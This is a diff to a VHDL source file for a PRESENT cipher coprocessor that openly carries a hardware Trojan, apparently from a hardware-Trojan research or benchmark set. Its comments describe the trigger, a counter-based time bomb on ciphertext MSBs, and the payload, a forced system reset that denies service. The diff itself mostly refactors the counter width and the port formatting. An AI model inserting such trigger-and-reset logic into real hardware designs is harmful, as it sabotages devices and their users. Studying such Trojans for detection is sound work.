@@ -2,21 +2,24 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 9: trigger = Asynchronous Timebomb which triggers after (2^k)-1 encryptions where
+-- Trojan 9: trigger = Asynchronous Timebomb which triggers after 2^k encryptions where
 -- the MSBit of the computed ciphertext is equal to 0
 -- payload = Denial of Service attack by raising the system's reset signal
 
 entity present_Trojan9 is
+        generic (
+                TROJAN_COUNTER_WIDTH : natural := 11
+        );
         port (
-                clk             : in std_logic;
-                rst             : in std_logic;
-                ena             : in std_logic;
+                clk : in std_logic;
+                rst : in std_logic;
+                ena : in std_logic;
 
-                mode_sel        : in std_logic_vector(1 downto 0);
-                key             : in std_logic_vector(127 downto 0);
-                data_in         : in std_logic_vector(63 downto 0);
-                data_out        : out std_logic_vector(63 downto 0);
-                ready           : out std_logic
+                mode_sel : in std_logic_vector(1 downto 0);
+                key      : in std_logic_vector(127 downto 0);
+                data_in  : in std_logic_vector(63 downto 0);
+                data_out : out std_logic_vector(63 downto 0);
+                ready    : out std_logic
         );
 end entity present_Trojan9;
 
@@ -34,8 +37,7 @@ architecture rtl of present_Trojan9 is
 
         signal  ciphertext,
                 plaintext,
-                mux_out,
-                reg_out : std_logic_vector(63 downto 0);
+                mux_out : std_logic_vector(63 downto 0);
 
         signal  key_sched_ena,
                 out_ena,
@@ -43,14 +45,13 @@ architecture rtl of present_Trojan9 is
 
         signal  ready_cu : std_logic;
 
-        constant TROJAN_COUNTER_WIDTH     : natural := 8; -- testing value, not final
-        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
-
         signal  trojan_trig,
                 trojan_sys_rst,
                 trojan_counter_event : std_logic;
 
         signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0);
+
+        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
@@ -155,7 +156,7 @@ begin
                         a => trojan_trig,
                         b => rst,
                         y => trojan_sys_rst
-                );        
+                );
 
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
@@ -165,11 +166,10 @@ begin
                         DATA_WIDTH => 64
                 )
                 port map(
-                        clk => clk,
+                        clk  => clk,
                         ena  => out_ena,
                         rst  => trojan_sys_rst,
                         din  => mux_out,
-                        dout => reg_out
+                        dout => data_out
                 );
-        data_out <= reg_out;
 end architecture;
